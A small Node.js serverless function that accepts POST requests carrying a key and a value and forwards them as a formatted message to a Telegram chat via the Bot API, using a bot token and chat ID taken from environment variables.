const axios = require('axios');

module.exports = async (req, res) => {

    const TOKEN = process.env.BOT_TOKEN;
    const CHAT_ID = process.env.CHAT_ID;

    if (req.method === 'POST') {
        const { key, value } = req.body;
        
        try {
            await axios.post(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                chat_id: CHAT_ID,
                text: ` *KEY:* ${key}\n *DATA:* ${value}`,
                parse_mode: 'Markdown'
            });
            return res.status(200).json({ success: true });
        } catch (err) {
            return res.status(500).json({ error: 'Telegram API Error' });
        }
    }
    res.status(405).json({ error: 'Only POST allowed' });
};